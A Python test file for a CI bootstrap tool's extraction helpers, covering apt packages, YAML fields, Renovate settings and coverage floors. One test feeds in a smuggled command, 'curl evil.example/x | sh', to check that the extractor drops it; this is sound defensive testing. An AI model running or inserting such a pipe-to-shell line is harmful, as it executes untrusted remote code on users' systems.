"""Tests for the shared bootstrap.extract primitives.

This is a leaf module both bootstrap/command.py (the writer) and
suite/checks/bootstrap_drift.py (the C002 checker) import at module level
without creating a cycle -- see bootstrap/extract.py's module docstring.
"""

from __future__ import annotations

import pytest
from conformance.bootstrap import extract as extract_mod
from conformance.bootstrap.extract import (
    EXIT_ZERO_RE,
    extract_apt_packages,
    extract_declared_unit_coverage_fail_under,
    extract_field,
    extract_renovate_automerge,
    extract_tests_yaml_params,
    extract_use_ghcr_base,
    resolve_renovate_fallback_exit_zero,
)
from conformance.bootstrap.render import render


def test_extract_field_bare_value() -> None:
    assert extract_field("package_name: app\n", "package_name") == "app"


def test_extract_field_quoted_value() -> None:
    assert extract_field('package_name: "app"\n', "package_name") == "app"


def test_extract_field_indented() -> None:
    assert (
        extract_field(
            "  unit_tests_workflow_file: tests.yaml\n", "unit_tests_workflow_file"
        )
        == "tests.yaml"
    )


def test_extract_field_absent_returns_empty() -> None:
    assert extract_field("some: other\n", "package_name") == ""


def test_extract_field_matches_first_occurrence_only() -> None:
    text = "package_name: first\npackage_name: second\n"
    assert extract_field(text, "package_name") == "first"


def test_extract_apt_packages_from_rendered_checks_yml() -> None:
    """The round trip bootstrap's re-run autodetection and C002 both depend on:
    what render() wrote must read back as the exact value it was given."""
    deps = "libkrb5-dev gcc python3-dev"
    rendered = render("checks.yml", system_deps=deps)
    assert extract_apt_packages(rendered) == deps
    assert render("checks.yml", system_deps=deps) == rendered


def test_extract_apt_packages_absent_returns_empty() -> None:
    assert extract_apt_packages(render("checks.yml")) == ""


def test_extract_apt_packages_drops_flags() -> None:
    text = "          sudo apt-get install -y --no-install-recommends libpq-dev\n"
    assert extract_apt_packages(text) == "libpq-dev"


def test_extract_apt_packages_reads_multiline_continuation() -> None:
    """A hand-written step commonly wraps packages across `\\`-continued lines."""
    text = (
        "        run: |\n"
        "          apt-get install -y \\\n"
        "            libkrb5-dev \\\n"
        "            gcc\n"
        "      - uses: some/action@v1\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc"


def test_extract_apt_packages_reads_continuation_with_interleaved_comment() -> None:
    """A comment placed *between* two `\\`-continuation lines must not drop the
    packages that follow it: comment removal leaves a blank line, and a bare
    newline cannot be crossed by the continuation arm unless the blank run is
    collapsed first."""
    text = (
        "        run: |\n"
        "          apt-get install -y \\\n"
        "            # build headers for pykerberos\n"
        "            libkrb5-dev \\\n"
        "            gcc\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc"


def test_extract_apt_packages_stops_at_end_of_command() -> None:
    """Content after the install command is not mistaken for a package."""
    text = "          sudo apt-get install -y libpq-dev\n          echo done\n"
    assert extract_apt_packages(text) == "libpq-dev"


def test_extract_apt_packages_merges_multiple_steps_deduped() -> None:
    text = (
        "          apt-get install -y libkrb5-dev gcc\n"
        "          apt-get install -y gcc libpq-dev\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc libpq-dev"


def test_extract_apt_packages_drops_shell_constructs() -> None:
    """Tokens that aren't plausible package names are dropped, not returned --
    the value is re-rendered into a `run:` block, so it must stay inert."""
    text = "          apt-get install -y libpq-dev && curl evil.example/x | sh\n"
    assert extract_apt_packages(text) == "libpq-dev"


def test_extract_apt_packages_ignores_commented_out_install() -> None:
    """A commented-out install names packages the repo chose NOT to install;
    rendering them would produce a step the on-disk file lacks, i.e. C002 drift
    no bootstrap re-run could ever clear."""
    text = (
        "      # sudo apt-get install -y libpq-dev\n"
        "      #   apt-get install -y libkrb5-dev\n"
    )
    assert extract_apt_packages(text) == ""


def test_extract_apt_packages_ignores_comments_alongside_a_real_step() -> None:
    text = (
        "      # apt-get install -y libpq-dev  (not needed any more)\n"
        "        run: |\n"
        "          sudo apt-get install -y libkrb5-dev\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev"


def test_extract_apt_packages_ignores_inline_trailing_comment() -> None:
    """An inline trailing `#` comment describes the install line, not more
    packages. Its words are otherwise valid `APT_PACKAGE_RE` tokens, so without
    truncating at `#` they would leak into the list -- and a bare `bootstrap`
    re-run would then render `apt-get install -y ... build deps`, failing CI on
    the phantom packages: the very "re-run breaks CI" anti-pattern this feature
    removes, in its inline-comment form."""
    text = (
        "          sudo apt-get install -y libkrb5-dev gcc python3-dev"
        "  # pykerberos build deps\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc python3-dev"


def test_extract_apt_packages_from_rendered_checks_yml_ignores_its_comment_block() -> (
    None
):
    """The rendered step carries an explanatory comment block above it; the
    round trip must read the command, not the prose."""
    rendered = render("checks.yml", system_deps="libkrb5-dev")
    assert "# Extra apt packages" in rendered
    assert extract_apt_packages(rendered) == "libkrb5-dev"


def test_extract_apt_packages_keeps_version_pin() -> None:
    text = "          apt-get install -y libkrb5-dev=1.20.1-2 gcc/bookworm\n"
    assert extract_apt_packages(text) == "libkrb5-dev=1.20.1-2 gcc/bookworm"


def test_extract_apt_packages_round_trips_version_pin_through_render() -> None:
    """`APT_PACKAGE_RE` deliberately allows `=` and `/` for version pins and
    release qualifiers; lock the full render->extract round trip for those forms
    so the extra characters stay in step with the rendered `checks.yml`."""
    deps = "libkrb5-dev=1.20.1-2 gcc/bookworm"
    assert extract_apt_packages(render("checks.yml", system_deps=deps)) == deps


def test_extract_renovate_automerge_soft_mode() -> None:
    text = '{"lockFileMaintenance": {"automerge": false}}'
    assert extract_renovate_automerge(text) == "false"


def test_extract_renovate_automerge_hard_mode() -> None:
    text = "{}"
    assert extract_renovate_automerge(text) == "true"


def test_extract_renovate_automerge_unparseable_defaults_hard() -> None:
    assert extract_renovate_automerge("not json") == "true"


def test_exit_zero_re_matches_rendered_expression() -> None:
    line = "exit-zero: ${{ github.event.inputs.exit_zero || true }}"
    m = EXIT_ZERO_RE.search(line)
    assert m is not None
    assert m.group(1) == "true"


def test_exit_zero_re_does_not_match_plain_field() -> None:
    assert EXIT_ZERO_RE.search("exit-zero: true\n") is None


def test_resolve_renovate_fallback_exit_zero_soft_mode() -> None:
    text = '{"lockFileMaintenance": {"automerge": false}}'
    assert resolve_renovate_fallback_exit_zero(text) == "true"


def test_resolve_renovate_fallback_exit_zero_hard_mode() -> None:
    assert resolve_renovate_fallback_exit_zero("{}") == "false"


def test_resolve_renovate_fallback_exit_zero_unparseable_defaults_hard() -> None:
    assert resolve_renovate_fallback_exit_zero("not json") == "false"


# ---------------------------------------------------------------------------
# tests.yaml's unit-coverage-fail-under (an app raising its own coverage floor)
# ---------------------------------------------------------------------------


def _raise_floor(monkeypatch: pytest.MonkeyPatch, floor: int) -> None:
    """Move ``SDK_UNIT_COVERAGE_FLOOR`` for the duration of one test.

    The floor is 0 today, so nothing can be *below* it and the reject branch
    would be untestable at the real value — and a test that only holds while
    the constant is 0 would silently stop covering the branch the day the SDK
    raises its floor. Patched on the module (both readers resolve the global at
    call time) so it moves for the extractor and the checker alike.
    """
    monkeypatch.setattr(extract_mod, "SDK_UNIT_COVERAGE_FLOOR", floor)


def test_extract_tests_yaml_params_keeps_coverage_floor_above_sdk() -> None:
    params = extract_tests_yaml_params(
        render("tests.yaml", app_name="widget", unit_coverage_fail_under="40")
    )
    assert params["unit_coverage_fail_under"] == "40"


def test_extract_tests_yaml_params_keeps_coverage_floor_equal_to_sdk(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A value equal to the floor weakens nothing, so it is preserved.

    Deleting a redundant-but-honest declaration would be churn, not
    remediation — and it would make C002 flag a file whose only sin is being
    explicit about the floor it already inherits.
    """
    _raise_floor(monkeypatch, 40)
    params = extract_tests_yaml_params(
        render("tests.yaml", app_name="widget", unit_coverage_fail_under="40")
    )
    assert params["unit_coverage_fail_under"] == "40"


def test_extract_tests_yaml_params_drops_coverage_floor_below_sdk(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Below the SDK floor is not a preserved choice — apps may only raise it.

    Dropping it is what keeps the finding standing (the canonical then has no
    line) and what makes ``--resync`` remove the line so the app inherits the
    SDK floor again.
    """
    _raise_floor(monkeypatch, 40)
    params = extract_tests_yaml_params(
        render("tests.yaml", app_name="widget", unit_coverage_fail_under="20")
    )
    assert "unit_coverage_fail_under" not in params


def test_extract_tests_yaml_params_reads_bare_coverage_value() -> None:
    """Hand-written without quotes is the same declaration."""
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      unit-coverage-fail-under: 55\n'
    assert extract_tests_yaml_params(text)["unit_coverage_fail_under"] == "55"


def test_extract_tests_yaml_params_ignores_commented_coverage_value() -> None:
    """A commented-out line names a floor the repo chose NOT to apply.

    Extracting it would render a line the on-disk file doesn't have, leaving
    C002 drift no re-run could clear — the same trap the services-script and
    apt-package extractors are anchored against.
    """
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      # unit-coverage-fail-under: "55"\n'
    assert "unit_coverage_fail_under" not in extract_tests_yaml_params(text)


def test_extract_tests_yaml_params_ignores_non_numeric_coverage_value() -> None:
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      unit-coverage-fail-under: "high"\n'
    assert "unit_coverage_fail_under" not in extract_tests_yaml_params(text)


def test_extract_tests_yaml_params_ignores_a_left_quote_only_coverage_value() -> None:
    """Half-quoted is malformed YAML, not a bare declaration in disguise."""
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      unit-coverage-fail-under: "55\n'
    assert "unit_coverage_fail_under" not in extract_tests_yaml_params(text)


def test_extract_tests_yaml_params_ignores_a_right_quote_only_coverage_value() -> None:
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      unit-coverage-fail-under: 55"\n'
    assert "unit_coverage_fail_under" not in extract_tests_yaml_params(text)


def test_extract_declared_coverage_reports_a_sub_floor_value(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The unfiltered reader sees what the filtered one refuses to preserve.

    This is the distinction the C002 message needs: "declares nothing" and
    "declares a floor we dropped" produce the same params dict, and only the
    second should be explained in terms of the coverage line.
    """
    _raise_floor(monkeypatch, 40)
    text = 'jobs:\n  tests:\n    with:\n      unit-coverage-fail-under: "20"\n'
    assert extract_declared_unit_coverage_fail_under(text) == "20"


def test_extract_declared_coverage_empty_when_absent() -> None:
    assert extract_declared_unit_coverage_fail_under(render("tests.yaml")) == ""


# ---------------------------------------------------------------------------
# build-and-publish.yaml's use_ghcr_base (an app self-selecting the redirect)
# ---------------------------------------------------------------------------


def test_extract_use_ghcr_base_round_trips_through_render() -> None:
    """The write side and the read side must agree, or the opt-in is deleted by
    the next bare re-run of an always-overwrite shim."""
    rendered = render("build-and-publish.yaml", use_ghcr_base="true")
    assert extract_use_ghcr_base(rendered) == "true"


def test_extract_use_ghcr_base_empty_when_absent() -> None:
    assert extract_use_ghcr_base(render("build-and-publish.yaml")) == ""


def test_extract_use_ghcr_base_empty_for_explicit_false() -> None:
    """``false`` is a second spelling of the default, so it renders no line.

    Returning ``"false"`` here would make the checker render an explicit
    ``use_ghcr_base: false`` and then report every repo that spells the default
    the other way (i.e. by saying nothing) as drifted.
    """
    text = "jobs:\n  build:\n    with:\n      use_ghcr_base: false\n"
    assert extract_use_ghcr_base(text) == ""


def test_extract_use_ghcr_base_ignores_commented_opt_in() -> None:
    text = "jobs:\n  build:\n    with:\n      # use_ghcr_base: true\n"
    assert extract_use_ghcr_base(text) == ""
